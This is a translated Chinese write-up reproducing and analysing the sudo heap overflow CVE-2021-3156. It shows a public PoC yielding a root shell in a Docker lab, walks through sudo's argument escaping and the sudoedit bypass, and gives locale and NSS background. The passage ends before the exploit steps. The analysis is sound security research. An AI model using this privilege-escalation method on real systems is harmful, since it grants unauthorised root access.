# CVE-2021-3156 sudo heap-based bufoverflow 复现&分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
`CVE-2021-3156`是`sudo`的一个堆溢出漏洞，可以用来进行本地提权。在类`uninx`中非`root`可以使用`sudo`来以`root`的权限执行操作。由于`sudo`错误的转义了`\`导致了一个堆溢出漏洞。
漏洞影响版本为`1.8.2-1.8.31sp12, 1.9.0-1.9.5sp1`，`sudo >=1.9.5sp2`的版本则不受影响。
感谢`luc`师傅带我飞。
## 环境搭建
这里我使用的是`docker ubuntu 20.04`，查看一下`sudo`版本，这里需要注意的是首先需要创建一个普通权限的用户
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ sudo --version
    Sudo version 1.8.31
    Sudoers policy plugin version 1.8.31
    Sudoers file grammar version 46
    Sudoers I/O plugin version 1.8.31
执行命令`sudoedit -s /`如果回显
    root@c957df720fc7:~/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty# sudoedit -s /
    sudoedit: /: not a regular file
则表明存在漏洞，如果回显
    ➜  work sudoedit -s /
    usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
则表示漏洞已经被修复
## 漏洞分析
首先我们使用[exp](https://github.com/blasty/CVE-2021-3156)先执行一下
    root@c957df720fc7:~/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty# su normal
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ ls
    Makefile  README.md  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwich
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ make
    rm -rf libnss_X
    mkdir libnss_X
    gcc -o sudo-hax-me-a-sandwich hax.c
    gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ ./sudo-hax-me-a-sandwich 1
    ** CVE-2021-3156 PoC by blasty 
    using target: 'Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31'
    ** pray for your rootshell.. **
    [+] bl1ng bl1ng! We got it!
    # id
    uid=0(root) gid=0(root) groups=0(root),1000(normal)
    # exit
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$
当`sudo`以`-i,-s`参数启动即`MODE_SHELL,MODE_LOGIN_SHELl`标志启动的时候，`sudo`会使用`\`转义所有的元字符，并重写`argc,argv`
    //src/parse_args.c/parse_args
    if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
      char **av, *cmnd = NULL;
      int ac = 1;
      if (argc != 0) {
        /* shell -c "command" */
        char *src, *dst;
        size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) +
          strlen(argv[argc - 1]) + 1;
        cmnd = dst = reallocarray(NULL, cmnd_size, 2);
        if (cmnd == NULL)
          sudo_fatalx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
        if (!gc_add(GC_PTR, cmnd))
          exit(1);
        for (av = argv; *av != NULL; av++) {// 串联所有的命令参数字符串
          for (src = *av; *src != '\0'; src++) {
            /* quote potential meta characters */
            // 用\转义所有的元字符
            if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
              *dst++ = '\\';
            *dst++ = *src;
          }
          *dst++ = ' ';
        }
        if (cmnd != dst)
          dst--;  /* replace last space with a NUL */
        *dst = '\0';
        ac += 2; /* -c cmnd */
      }
      // 重写argc，argv
      av = reallocarray(NULL, ac + 1, sizeof(char *));
      if (av == NULL)
        sudo_fatalx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
      if (!gc_add(GC_PTR, av))
        exit(1);
      av[0] = (char *)user_details.shell; /* plugin may override shell */
      if (cmnd != NULL) {
        av[1] = "-c";
        av[2] = cmnd;
      }
      av[ac] = NULL;
      argv = av;
      argc = ac;
    }
之后会在`sudoers_policy_main`函数中调用`set_cmnd`函数
    //plugins/sudoers/sudoers.c
    int
      sudoers_policy_main(int argc, char * const argv[], int pwflag, char *env_add[],
                          bool verbose, void *closure)
    {
      //...
      /* Find command in path and apply per-command Defaults. */
      cmnd_status = set_cmnd();
      if (cmnd_status == NOT_FOUND_ERROR)
        goto done;
      //...
    }
    static int
      set_cmnd(void)
    {
      //...
      if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
     847         if (NewArgc > 1) {
     848             char *to, *from, **av;
     849             size_t size, n;
     850
     851             /* Alloc and build up user_args. */
     852             for (size = 0, av = NewArgv + 1; *av; av++)
     853                 size += strlen(*av) + 1;
     854             if (size == 0 || (user_args = malloc(size)) == NULL) {
     855                 sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
     856                 debug_return_int(-1);
     857             }
     858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
     859                 /*
     860                  * When running a command via a shell, the sudo front-end
     861                  * escapes potential meta chars.  We unescape non-spaces
     862                  * for sudoers matching and logging purposes.
     863                  */
     864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
     865                     while (*from) {
     866                         if (from[0] == '\\' && !isspace((unsigned char)from[1]))
     867                             from++;
     868                         *to++ = *from++;
     869                     }
     870                     *to++ = ' ';
     871                 }
     872                 *--to = '\0';
     873             } else {
     874                 //...
     885         }
     886     }
      }
    //...
    }
从代码中我们可以看出，函数首先按照`argv`中参数的大小申请一块堆空间`user_args`，然后依次将命令行参数链接到该堆空间中。
但是如果当一个命令行参数以反斜杠结尾，即`from[0]=\,from[1]=null`，就会满足`866`行的条件，使得`from++`指向`null`，但是之后`868`行执行的拷贝操作又会使得`from++`从而越过了`null`，那么接下来的`while`循环就会发生越界拷贝。拷贝的内容将会复制到`user_args`堆块中，从而发生堆溢出。
但是理论在设置了`MODE_SHELL,MODE_LOGIN_SHELL`的条件下任何命令行参数都不可能以`\`结尾，因为其在`parse_args`函数中会对所有的元字符进行转义包括这个`\`。
但是这两个函数中的判断条件有所不同
    //parse_args
    if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)){}
    //sudoers_policy_main
    if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
      if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)){}
    }
那么如果我们想要成功的利用堆溢出就需要在设置`flags=MODE_SHELL/MODE_LOGIN_SHELL`的条件下而不设置`mode=MODE_RUN`以避免转移代码的执行。那么根据`sudoers_policy_main`中的条件，我们只能设置`MODE_EDIT
| MODE_CHECK`这两个标志位了，来看一下设置的代码
            case 'e':
                if (mode && mode != MODE_EDIT)
                usage_excl(1);
                mode = MODE_EDIT;
                sudo_settings[ARG_SUDOEDIT].value = "true";
                valid_flags = MODE_NONINTERACTIVE;
                break;
            case 'l':
                if (mode) {
                if (mode == MODE_LIST)
                    SET(flags, MODE_LONG_LIST);
                else
                    usage_excl(1);
                }
                mode = MODE_LIST;
                valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;
                break;
        if (argc > 0 && mode == MODE_LIST)
        mode = MODE_CHECK;
但是如果我们设置了这两个标志位，并且设置了`MODE_SHELL/MODE_LOGIN_SHELL`的话，在后续会被检测到并退出
    if ((flags & valid_flags) != flags)
      usage(1);// Give usage message and exit.
但是当我们以`sudoedit`执行的时候
    if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
      progname = "sudoedit";
      mode = MODE_EDIT;
      sudo_settings[ARG_SUDOEDIT].value = "true";
    }
这里只会设置`mode = MODE_EDIT`，而并不会设置`valid_flags`，也就不会检测退出，我们就可以正常执行到堆溢出的部分。
这个漏洞是非常友好的，因为我们可以通过控制命令行参数从而控制`user_args`堆块申请的大小，溢出的内容以及溢出的长度。并且攻击者可以通过以反斜杠结尾的方式实现向目标地址写`0`。
## 漏洞利用
###  背景知识
这在进行分析之前我们首先需要了解一下`locale`和`nss`相关的信息。
`locale`是根据计算机用户所使用的语言，所在的国家和地区所定义的一个软件运行时的语言环境，通常通过环境变量进行设置，`locale`相关的环境变量生效的顺序如下
  1. `LANGUAGE`指定个人对语言环境的主次偏好，如`zh_CN:en_US`
  2. `LC_ALL`是一个可以被`setlocale`设置的宏，其值可以覆盖所有其他的`locale`设定
  3. `LC_XXX`详细设定`locale`的各个方面，可以覆盖`LANG`的值
  4. `LANG`指定默认使用的`locale`
当`LC_ALL/LANG`被设置为`C`的时候，`LANGUAGE`的值将会被忽略。其命名规则如下
    language[_territory[.codeset]][@modifier]
其中`language`是[ISO
639-1](https://zh.wikipedia.org/wiki/ISO_639-1)标准中定义的双字母的语言代码，`territory`是[ISO
3166-1](https://zh.wikipedia.org/wiki/ISO_3166-1)标准中定义的双字母的国家和地区代码，`codeset`是字符集的名称
(如 UTF-8等)，而 `modifier` 则是某些`locale`变体的修正符。我们可以详细的设置共`12`个环境变量
    pwndbg> p _nl_category_names
    $1 = {
      str41 = "LC_COLLATE",
      str67 = "LC_CTYPE",
      str140 = "LC_MONETARY",
      str193 = "LC_NUMERIC",
      str207 = "LC_TIME",
      str259 = "LC_MESSAGES",
      str270 = "LC_PAPER",
      str279 = "LC_NAME",
      str292 = "LC_ADDRESS",
      str311 = "LC_TELEPHONE",
      str322 = "LC_MEASUREMENT",
      str330 = "LC_IDENTIFICATION"
    }
`nss`全称为`Name Service
Switch`，在`*nix`操作系统中，`nss`是`C`语言库的一部分，用来解析`name`，比如登陆用户的用户名以及`IP`地址到域名的解析。举个例子，当我们输入命令`ls
-alg`即查看一个目录中的文件列表，对于每一个文件我们可以看到它所属的用户和用户组，但是实际上系统中只保存了用户和用户组的`id`，要想显示与之相关的字符这就需要`nss`进行解析。我们可以在配置文件`/etc/nsswitch.conf`中定义相关数据库的查找规范
    root@2c3723801aeb:/home/normal/CVE-2021-3156_blasty# cat /etc/nsswitch.conf
    # /etc/nsswitch.conf
    #
    # Example configuration of GNU Name Service Switch functionality.
    # If you have the `glibc-doc-reference' and `info' packages installed, try:
    # `info libc "Name Service Switch"' for information about this file.
    passwd:         files systemd
    group:          files systemd
    shadow:         files
    gshadow:        files
    hosts:          files dns
    networks:       files
    protocols:      db files
    services:       db files
    ethers:         db files
    rpc:            db files
    netgroup:       nis
对于每个可用的查找规范即`service`都必须有文件`libnss_service.so.2`与之对应，例如`group`数据库定义了查找规范`files`，那么在调用`getgroup`函数的时候就会调用`libnss_files.so.2`中的`nss_lookup_function`函数进行查找。因此我们可以在`ubuntu`中找到下面的共享库
    libnss_compat-2.31.so
    libnss_compat.so
    libnss_compat.so.2
    libnss_dns-2.31.so
    libnss_dns.so
    libnss_dns.so.2
    libnss_files-2.31.so
    libnss_files.so
    libnss_files.so.2
    libnss_hesiod-2.31.so
    libnss_hesiod.so
    libnss_hesiod.so.2
    libnss_nis-2.31.so
    libnss_nis.so
    libnss_nis.so.2